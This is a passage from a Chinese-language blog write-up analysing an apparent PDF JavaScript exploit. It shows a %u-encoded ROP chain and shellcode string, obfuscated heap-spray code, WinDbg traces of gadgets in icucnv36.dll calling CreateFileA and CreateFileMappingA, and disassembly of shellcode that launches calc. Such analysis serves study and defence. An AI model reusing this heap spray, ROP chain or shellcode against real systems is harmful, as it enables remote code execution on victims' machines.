class="string">'%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%u64b8%u9c0f%uda97%ud9cc%u2474%u5ef4%uc929%u31b1%uc683%u3104%u0f46%u4603%ued6b%u6b69%u739b%u9491%u145b%u711b%u146a%uf17f%ua4dc%u570b%u4fd0%u4c59%u3d63%u6376%u88c4%u4aa0%ua1d5%ucd91%ub855%u2dc5%u7364%u2f18%u6ea1%u7dd1%ue47a%u9244%ub00f%u1954%u5443%ufedd%u5713%u50cc%u0e28%u53ce%u3afd%u4c47%u07e2%ue711%ufcd0%u21a0%ufc29%u0c0f%u0f86%u4851%uf020%ua024%u8d53%u773e%u492e%u6cca%u1a88%u496c%uce29%u1aeb%ubb25%u4478%u3a29%ufeac%ub755%ud153%u83dc%uf577%u5085%uac19%u3663%uae26%ue7cc%ua482%ufce0%ue6be%u026e%u9d4c%u04dc%u9e4e%u6d70%u157f%uea1f%ufc80%u0464%u5dcb%u8dcc%u3792%ud04d%ue224%ued91%u07a6%u0a69%u6db6%u566c%u9d70%uc71c%ua115%ue8b3%uc23f%u7b52%u2ba3%ufbf1%u3446'</span> );</span><br><span class="line"><span class="keyword">var</span> NrWJJGMFyDgCbq = mqraPQZSAwAwCczJcaACUcIIwCnLbss( <span class="string">"%"</span> + <span class="string">"u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"%u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> );</span><br><span class="line"><span class="keyword">while</span> (NrWJJGMFyDgCbq.length + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>) NrWJJGMFyDgCbq+=NrWJJGMFyDgCbq;</span><br><span class="line">BuWToJIZTn = NrWJJGMFyDgCbq.substring(<span class="number">0</span>, (<span class="number">0x0c0c</span><span class="number">-0x24</span>)/<span class="number">2</span>);</span><br><span class="line">BuWToJIZTn += twSOePGGglyJWdlzCpRIHpSsaEoDFZmatVqAcDoCSkrLKdpcOIBqGOVtWQMSEAGMpVRA;</span><br><span class="line">BuWToJIZTn += NrWJJGMFyDgCbq;</span><br><span class="line">wrIFk = BuWToJIZTn.substring(<span class="number">0</span>, <span class="number">65536</span>/<span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span>(wrIFk.length &lt; <span class="number">0x80000</span>) wrIFk += wrIFk;</span><br><span class="line">TjCv = wrIFk.substring(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span><span class="number">-0x08</span>) / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> erZHzdqUNRLxpgKzIZXauOqtrPeTBcQpgRKVLwLA = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (wABhQLfeICwQWoJJAlzOKIJXBheCXUwFoFqgj=<span class="number">0</span>;wABhQLfeICwQWoJJAlzOKIJXBheCXUwFoFqgj&lt;<span class="number">0x1f0</span>;wABhQLfeICwQWoJJAlzOKIJXBheCXUwFoFqgj++) erZHzdqUNRLxpgKzIZXauOqtrPeTBcQpgRKVLwLA[wABhQLfeICwQWoJJAlzOKIJXBheCXUwFoFqgj]=TjCv+<span class="string">"s"</span>;</span><br></pre></td></tr></table></figure></p><p>上面的 <code>shellcode</code> 是能还原出来的，不过为了熟悉下调试还是用 <code>windbg</code>吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dd 0c0c0c0c L20</span><br><span class="line">0c0c0c0c  4a8063a5 4a8a0000 4a802196 4a801f90</span><br><span class="line">0c0c0c1c  4a84903c 4a80b692 4a801064 4a8522c8</span><br><span class="line">0c0c0c2c  10000000 00000000 00000000 00000002</span><br><span class="line">0c0c0c3c  00000102 00000000 4a8063a5 4a801064</span><br><span class="line">0c0c0c4c  4a842db2 4a802ab1 00000008 4a80a8a6</span><br><span class="line">0c0c0c5c  4a801f90 4a849038 4a80b692 4a801064</span><br><span class="line">0c0c0c6c  ffffffff 00000000 00000040 00000000</span><br><span class="line">0c0c0c7c  00010000 00000000 4a8063a5 4a801064</span><br></pre></td></tr></table></figure></p><p>我们先来看下堆中这些数据的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; u 4a8063a5 </span><br><span class="line">icucnv36!uenum_count_3_6+0x1d:</span><br><span class="line">4a8063a5 59              pop     ecx</span><br><span class="line">4a8063a6 c3              ret</span><br></pre></td></tr></table></figure></p><p>执行完成后 <code>ecx = 0x4a8a0000</code>,再来看下 <code>0x4a802196</code> 处<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; u 4a802196</span><br><span class="line">icucnv36!ubidi_getClassCallback_3_6+0x22:</span><br><span class="line">4a802196 8901            mov     dword ptr [ecx],eax</span><br><span class="line">4a802198 c3              ret</span><br></pre></td></tr></table></figure></p><p>执行完后 <code>[0x4a8a0000] = 0x0012e6d0</code>,之后跳到了 <code>0x4a801f90</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; u 4a801f90</span><br><span class="line">icucnv36!ubidi_getDirection_3_6+0x18:</span><br><span class="line">4a801f90 58              pop     eax</span><br><span class="line">4a801f91 c3              ret</span><br></pre></td></tr></table></figure></p><p>最后 <code>eax =4a84903c</code>,跳到了 <code>0x4a80b692</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; u 4a80b692</span><br><span class="line">icucnv36!u_errorName_3_6+0xdf:</span><br><span class="line">4a80b692 ff20            jmp     dword ptr [eax]</span><br></pre></td></tr></table></figure></p><p><code>0x4a84903c</code> 实际上是 <code>icucnv36.dll</code> 里函数<code>CreateFileA</code> 在导入表中的地址，所以这样就完成了对<code>CreateFileA</code>函数的调用。<br>函数参数如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dd 0c0c0c28 L7</span><br><span class="line">0c0c0c28  4a8522c8 10000000 00000000 00000000</span><br><span class="line">0c0c0c38  00000002 00000102 00000000</span><br><span class="line">0:000&gt; da 4a8522c8</span><br><span class="line">4a8522c8  &quot;iso88591&quot;</span><br></pre></td></tr></table></figure></p><p>即<code>CreateFileA(0x4a8522c8,GENERIC_ALL,0,NULL,CREATE_ALWAYS,HIDDEN|TEMPORARY,NULL)</code>。<br>之后通过 <code>0x4a801064</code> 处的 <code>ret</code> 指令重新反回到了<code>icucnv36.dll</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eax=00000328 ebx=00000000 ecx=7c93003d edx=04c30002 esi=01efc87c edi=0012e718</span><br><span class="line">eip=4a801064 esp=0c0c0c44 ebp=f012512c iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200293</span><br><span class="line">icucnv36+0x1064:</span><br><span class="line">4a801064 c3              ret</span><br></pre></td></tr></table></figure></p><p>然后看下如何再一次控制 <code>eip</code> 去完成我们想做的事情。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; </span><br><span class="line">eax=00000328 ebx=00000000 ecx=7c93003d edx=04c30002 esi=01efc87c edi=0012e718</span><br><span class="line">eip=4a8063a5 esp=0c0c0c48 ebp=f012512c iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200293</span><br><span class="line">icucnv36!uenum_count_3_6+0x1d:</span><br><span class="line">4a8063a5 59              pop     ecx</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=00000328 ebx=00000000 ecx=4a801064 edx=04c30002 esi=01efc87c edi=0012e718</span><br><span class="line">eip=4a8063a6 esp=0c0c0c4c ebp=f012512c iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200293</span><br><span class="line">icucnv36!uenum_count_3_6+0x1e:</span><br><span class="line">4a8063a6 c3              ret</span><br><span class="line">0:000&gt; </span><br><span class="line">eax=00000328 ebx=00000000 ecx=4a801064 edx=04c30002 esi=01efc87c edi=0012e718</span><br><span class="line">eip=4a842db2 esp=0c0c0c50 ebp=f012512c iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200293</span><br><span class="line">icucnv36!u_strFromUTF32_3_6+0x142:</span><br><span class="line">4a842db2 97              xchg    eax,edi</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=0012e718 ebx=00000000 ecx=4a801064 edx=04c30002 esi=01efc87c edi=00000328</span><br><span class="line">eip=4a842db3 esp=0c0c0c50 ebp=f012512c iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200293</span><br><span class="line">icucnv36!u_strFromUTF32_3_6+0x143:</span><br><span class="line">4a842db3 c3              ret</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=0012e718 ebx=00000000 ecx=4a801064 edx=04c30002 esi=01efc87c edi=00000328</span><br><span class="line">eip=4a802ab1 esp=0c0c0c54 ebp=f012512c iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200293</span><br><span class="line">icucnv36!ubidi_getDummy_3_6+0xc7:</span><br><span class="line">4a802ab1 5b              pop     ebx</span><br></pre></td></tr></table></figure></p><p>实际上下面要执行的 <code>gadget</code> 的作用是重新控制 <code>eip</code> ，和之前的<code>call    dword ptr [eax]</code> 是类似的，使用的 <code>gadget</code> 如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">icucnv36!ubidi_getDummy_3_6+0xc7:</span><br><span class="line">4a802ab1 5b              pop     ebx</span><br><span class="line">4a802ab2 c3              ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">icucnv36!uprv_pathIsAbsolute_3_6+0xd:</span><br><span class="line">4a80a8a6 213c5c          and     dword ptr [esp+ebx*2],edi ss:0023:0c0c0c6c=ffffffff</span><br><span class="line">4a80a8a9 7503            jne     icucnv36!uprv_pathIsAbsolute_3_6+0x15 (4a80a8ae) [br=1]</span><br><span class="line">4a80a8ae 3c2f            cmp     al,2Fh</span><br><span class="line">4a80a8b0 74f9            je      icucnv36!uprv_pathIsAbsolute_3_6+0x12 (4a80a8ab) [br=0]</span><br><span class="line">4a80a8b2 3c41            cmp     al,41h</span><br><span class="line">4a80a8b4 7c04            jl      icucnv36!uprv_pathIsAbsolute_3_6+0x21 (4a80a8ba) [br=1]</span><br><span class="line">4a80a8ba 3c61            cmp     al,61h</span><br><span class="line">4a80a8bc 7c0a            jl      icucnv36!uprv_pathIsAbsolute_3_6+0x2f (4a80a8c8) [br=1]</span><br><span class="line">4a80a8c8 32c0            xor     al,al</span><br><span class="line">4a80a8ca c3              ret</span><br><span class="line"></span><br><span class="line">icucnv36!ubidi_getDirection_3_6+0x18:</span><br><span class="line">4a801f90 58              pop     eax</span><br><span class="line">4a801f91 c3              ret</span><br><span class="line"></span><br><span class="line">icucnv36!u_errorName_3_6+0xdf:</span><br><span class="line">4a80b692 ff20            jmp     dword ptr [eax]      ds:0023:4a849038=&#123;kernel32!CreateFileMappingA (7c8094ee)&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到这次调用了 <code>CreateFileMappingA</code> 函数，之后用相同的方法执行 <code>MapViewOfFile</code> 函数完成一段可执行内存空间的开辟。之后调用 <code>memcpy</code> 函数完成堆上 <code>shellcode</code> 的复制。查看 <code>shellcode</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">029e0000</span> b8640f9c97      mov     eax,<span class="number">979</span>C0F64h</span><br><span class="line"><span class="number">029e0005</span> dacc            fcmove  st,st(<span class="number">4</span>)</span><br><span class="line"><span class="number">029e0007</span> d97424f4        fnstenv [esp<span class="number">-0</span>Ch]</span><br><span class="line"><span class="number">029e000</span>b <span class="number">5</span>e              pop     esi</span><br><span class="line"><span class="number">029e000</span>c <span class="number">29</span>c9            sub     ecx,ecx</span><br><span class="line"><span class="number">029e000</span>e b131            mov     cl,<span class="number">31</span>h</span><br><span class="line"><span class="number">029e0010</span> <span class="number">83</span>c604          add     esi,<span class="number">4</span></span><br><span class="line"><span class="number">029e0013</span> <span class="number">31460f</span>          xor     dword ptr [esi+<span class="number">0F</span>h],eax</span><br><span class="line"><span class="number">029e0016</span> <span class="number">03460f</span>          add     eax,dword ptr [esi+<span class="number">0F</span>h]</span><br><span class="line"><span class="number">029e0019</span> e2f5            loop    <span class="number">029e0010</span></span><br><span class="line"><span class="number">029e001</span>b fc              cld</span><br><span class="line"><span class="number">029e001</span>c e882000000      call    <span class="number">029e00</span>a3</span><br><span class="line"><span class="number">029e0021</span> <span class="number">60</span>              pushad</span><br><span class="line"><span class="number">029e0022</span> <span class="number">89e5</span>            mov     ebp,esp</span><br><span class="line"><span class="number">029e0024</span> <span class="number">31</span>c0            xor     eax,eax</span><br><span class="line"><span class="number">029e0026</span> <span class="number">648b</span>5030        mov     edx,dword ptr fs:[eax+<span class="number">30</span>h]</span><br><span class="line"><span class="number">029e002</span>a <span class="number">8b</span>520c          mov     edx,dword ptr [edx+<span class="number">0</span>Ch]</span><br><span class="line"><span class="number">029e002</span>d <span class="number">8b</span>5214          mov     edx,dword ptr [edx+<span class="number">14</span>h]</span><br><span class="line"><span class="number">029e0030</span> <span class="number">8b</span>7228          mov     esi,dword ptr [edx+<span class="number">28</span>h]</span><br><span class="line"><span class="number">029e0033</span> <span class="number">0f</span>b74a26        movzx   ecx,word ptr [edx+<span class="number">26</span>h]</span><br><span class="line"><span class="number">029e0037</span> <span class="number">31f</span>f            xor     edi,edi</span><br><span class="line"><span class="number">029e0039</span> ac              lods    byte ptr [esi]</span><br><span class="line"><span class="number">029e003</span>a <span class="number">3</span>c61            cmp     al,<span class="number">61</span>h</span><br><span class="line"><span class="number">029e003</span>c <span class="number">7</span>c02            jl      <span class="number">029e0040</span></span><br><span class="line"><span class="number">029e003</span>e <span class="number">2</span>c20            sub     al,<span class="number">20</span>h</span><br><span class="line"><span class="number">029e0040</span> c1cf0d          ror     edi,<span class="number">0</span>Dh</span><br><span class="line"><span class="number">029e0043</span> <span class="number">01</span>c7            add     edi,eax</span><br><span class="line"><span class="number">029e0045</span> e2f2            loop    <span class="number">029e0039</span></span><br><span class="line"><span class="number">029e0047</span> <span class="number">52</span>              push    edx</span><br><span class="line"><span class="number">029e0048</span> <span class="number">57</span>              push    edi</span><br><span class="line"><span class="number">029e0049</span> <span class="number">8b</span>5210          mov     edx,dword ptr [edx+<span class="number">10</span>h]</span><br><span class="line"><span class="number">029e004</span>c <span class="number">8b</span>4a3c          mov     ecx,dword ptr [edx+<span class="number">3</span>Ch]</span><br><span class="line"><span class="number">029e004</span>f <span class="number">8b</span>4c1178        mov     ecx,dword ptr [ecx+edx+<span class="number">78</span>h]</span><br><span class="line"><span class="number">029e0053</span> e348            jecxz   <span class="number">029e009</span>d</span><br><span class="line"><span class="number">029e0055</span> <span class="number">01</span>d1            add     ecx,edx</span><br><span class="line"><span class="number">029e0057</span> <span class="number">51</span>              push    ecx</span><br><span class="line"><span class="number">029e0058</span> <span class="number">8b</span>5920          mov     ebx,dword ptr [ecx+<span class="number">20</span>h]</span><br><span class="line"><span class="number">029e005</span>b <span class="number">01</span>d3            add     ebx,edx</span><br><span class="line"><span class="number">029e005</span>d <span class="number">8b</span>4918          mov     ecx,dword ptr [ecx+<span class="number">18</span>h]</span><br><span class="line"><span class="number">029e0060</span> e33a            jecxz   <span class="number">029e009</span>c</span><br><span class="line"><span class="number">029e0062</span> <span class="number">49</span>              dec     ecx</span><br><span class="line"><span class="number">029e0063</span> <span class="number">8b</span>348b          mov     esi,dword ptr [ebx+ecx*<span class="number">4</span>]</span><br><span class="line"><span class="number">029e0066</span> <span class="number">01</span>d6            add     esi,edx</span><br><span class="line"><span class="number">029e0068</span> <span class="number">31f</span>f            xor     edi,edi</span><br><span class="line"><span class="number">029e006</span>a ac              lods    byte ptr [esi]</span><br><span class="line"><span class="number">029e006</span>b c1cf0d          ror     edi,<span class="number">0</span>Dh</span><br><span class="line"><span class="number">029e006</span>e <span class="number">01</span>c7            add     edi,eax</span><br><span class="line"><span class="number">029e0070</span> <span class="number">38e0</span>            cmp     al,ah</span><br><span class="line"><span class="number">029e0072</span> <span class="number">75f</span>6            jne     <span class="number">029e006</span>a</span><br><span class="line"><span class="number">029e0074</span> <span class="number">037</span>df8          add     edi,dword ptr [ebp<span class="number">-8</span>]</span><br><span class="line"><span class="number">029e0077</span> <span class="number">3b</span>7d24          cmp     edi,dword ptr [ebp+<span class="number">24</span>h]</span><br><span class="line"><span class="number">029e007</span>a <span class="number">75e4</span>            jne     <span class="number">029e0060</span></span><br><span class="line"><span class="number">029e007</span>c <span class="number">58</span>              pop     eax</span><br><span class="line"><span class="number">029e007</span>d <span class="number">8b</span>5824          mov     ebx,dword ptr [eax+<span class="number">24</span>h]</span><br><span class="line"><span class="number">029e0080</span> <span class="number">01</span>d3            add     ebx,edx</span><br><span class="line"><span class="number">029e0082</span> <span class="number">668b</span>0c4b        mov     cx,word ptr [ebx+ecx*<span class="number">2</span>]</span><br><span class="line"><span class="number">029e0086</span> <span class="number">8b</span>581c          mov     ebx,dword ptr [eax+<span class="number">1</span>Ch]</span><br><span class="line"><span class="number">029e0089</span> <span class="number">01</span>d3            add     ebx,edx</span><br><span class="line"><span class="number">029e008</span>b <span class="number">8b</span>048b          mov     eax,dword ptr [ebx+ecx*<span class="number">4</span>]</span><br><span class="line"><span class="number">029e008</span>e <span class="number">01</span>d0            add     eax,edx</span><br><span class="line"><span class="number">029e0090</span> <span class="number">89442424</span>        mov     dword ptr [esp+<span class="number">24</span>h],eax</span><br><span class="line"><span class="number">029e0094</span> <span class="number">5b</span>              pop     ebx</span><br><span class="line"><span class="number">029e0095</span> <span class="number">5b</span>              pop     ebx</span><br><span class="line"><span class="number">029e0096</span> <span class="number">61</span>              popad</span><br><span class="line"><span class="number">029e0097</span> <span class="number">59</span>              pop     ecx</span><br><span class="line"><span class="number">029e0098</span> <span class="number">5</span>a              pop     edx</span><br><span class="line"><span class="number">029e0099</span> <span class="number">51</span>              push    ecx</span><br><span class="line"><span class="number">029e009</span>a ffe0            jmp     eax</span><br><span class="line"><span class="number">029e009</span>c <span class="number">5f</span>              pop     edi</span><br><span class="line"><span class="number">029e009</span>d <span class="number">5f</span>              pop     edi</span><br><span class="line"><span class="number">029e009</span>e <span class="number">5</span>a              pop     edx</span><br><span class="line"><span class="number">029e009</span>f <span class="number">8b</span>12            mov     edx,dword ptr [edx]</span><br><span class="line"><span class="number">029e00</span>a1 eb8d            jmp     <span class="number">029e0030</span></span><br><span class="line"><span class="number">029e00</span>a3 <span class="number">5</span>d              pop     ebp</span><br><span class="line"><span class="number">029e00</span>a4 <span class="number">6</span>a01            push    <span class="number">1</span></span><br><span class="line"><span class="number">029e00</span>a6 <span class="number">8</span>d85b2000000    lea     eax,[ebp+<span class="number">0B</span>2h]</span><br><span class="line"><span class="number">029e00</span>ac <span class="number">50</span>              push    eax</span><br><span class="line"><span class="number">029e00</span>ad <span class="number">68318b</span>6f87      push    <span class="number">876F</span>8B31h</span><br><span class="line"><span class="number">029e00</span>b2 ffd5            call    ebp</span><br><span class="line"><span class="number">029e00</span>b4 bbf0b5a256      mov     ebx,<span class="number">56</span>A2B5F0h</span><br><span class="line"><span class="number">029e00</span>b9 <span class="number">68</span>a695bd9d      push    <span class="number">9</span>DBD95A6h</span><br><span class="line"><span class="number">029e00</span>be ffd5            call    ebp</span><br><span class="line"><span class="number">029e00</span>c0 <span class="number">3</span>c06            cmp     al,<span class="number">6</span></span><br><span class="line"><span class="number">029e00</span>c2 <span class="number">7</span>c0a            jl      <span class="number">029e00</span>ce</span><br><span class="line"><span class="number">029e00</span>c4 <span class="number">80f</span>be0          cmp     bl,<span class="number">0E0</span>h</span><br><span class="line"><span class="number">029e00</span>c7 <span class="number">7505</span>            jne     <span class="number">029e00</span>ce</span><br><span class="line"><span class="number">029e00</span>c9 bb4713726f      mov     ebx,<span class="number">6F</span>721347h</span><br><span class="line"><span class="number">029e00</span>ce <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">029e00</span>d0 <span class="number">53</span>              push    ebx</span><br><span class="line"><span class="number">029e00</span>d1 ffd5            call    ebp</span><br><span class="line"><span class="number">029e00</span>d3 <span class="number">63616</span>c          arpl    word ptr [ecx+<span class="number">6</span>Ch],sp</span><br><span class="line"><span class="number">029e00</span>d6 <span class="number">632</span>e            arpl    word ptr [esi],bp</span><br><span class="line"><span class="number">029e00</span>d8 <span class="number">657865</span>          js      <span class="number">029e0140</span></span><br><span class="line"><span class="number">029e00</span>db <span class="number">000</span>c0c          add     byte ptr [esp+ecx],cl</span><br></pre></td></tr></table></figure></p><p>一个被变形过的 <code>shellcode</code>,很难看出来功能，在<code>kernel32!WinExec</code>处下断点可以发现功能是弹出计算器。可能是我太菜了，算了，就这样吧。</p><h2 id="exploit分析"><a href="#exploit分析" class="headerlink" title="exploit分析"></a>exploit分析</h2><p>先贴一下主要的代码<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span 